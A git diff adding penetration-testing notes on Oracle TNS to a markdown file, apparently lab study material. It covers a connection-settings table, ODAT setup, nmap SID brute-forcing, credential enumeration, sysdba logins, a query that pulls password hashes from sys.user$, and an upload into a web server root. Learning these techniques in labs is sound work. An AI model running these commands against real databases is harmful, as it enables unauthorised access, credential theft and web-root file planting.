@@ -1422,4 +1422,94 @@ ADR_BASE_LISTENER = C:\oracle
 - `PlsqlExclusionList` is a user created blacklist of packages or types that should be excluded from execution
   * located in `$ORACLE_HOME/sqldeveloper`
   * Cannot be accessed through the Oracle Application Server
-- [ ] Continue at `settings` table
+
+- Settings
+|Setting|Description|
+|-------|-----------|
+|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
+|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
+|`PROTOCOL`|The network protocol used for communication with the server|
+|`PORT`|The port number used for communication with the server|
+|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
+|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
+|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
+|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
+|`USER`|The username used to authenticate with the database server.|
+|`PASSWORD`|The password used to authenticate with the database server.|
+|`SECURITY`|The type of security for the connection.|
+|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
+|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
+|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
+|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|
+|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|
+|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|
+|`TRACE_LEVEL`|The level of tracing for the database connection.|
+|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
+|`TRACE_FILE_NAME`|The name of the trace file.|
+|`LOG_FILE`|The file where the log information is stored.|
+### Enumeration
+- Setting up
+    Oracle requires some special stuff to enumerate, mostly `ODAT` and its required libraries.
+```
+wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
+wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
+sudo mkdir -p /opt/oracle
+sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
+sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
+export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
+export PATH=$LD_LIBRARY_PATH:$PATH
+source ~/.bashrc
+cd ~
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+pip install python-libnmap
+git submodule init
+git submodule update
+pip3 install cx_Oracle
+sudo apt-get install python3-scapy -y
+sudo pip3 install colorlog termcolor passlib python-libnmap
+sudo apt-get install build-essential libgmp-dev -y
+pip3 install pycryptodome
+
+# Testing
+./odat.py -h
+```
+- Scanning with nmap
+```
+sudo nmap -p1521 -sV [IP] --open
+```
+We are really looking for a `SID` here. `SID`'s are how TNS determines the DB or service being requested.
+
+- Brute forcing `SID`'s with nmap
+```
+sudo nmap -p1521 -sV [IP] --open --script oracle-sid-brute
+```
+- Looking for credentials and further enumeration with odat.py
+```
+./odat.py all -s [IP]
+```
+### Interacting
+- Using SQLplus to login
+```
+sqlplus username/password@[IP]/[sid]
+
+# Login as sysdba
+sqlplus username/password@[IP]/[sid] as sysdba
+```
+> If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, execute the below.  
+```
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+```
+- Common Interactions
+Get all tables
+```
+select table_name from all_tables;
+```
+Extract password hashes
+```
+select name, password from sys.user$;
+```
+File Upload
+```
+./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+```
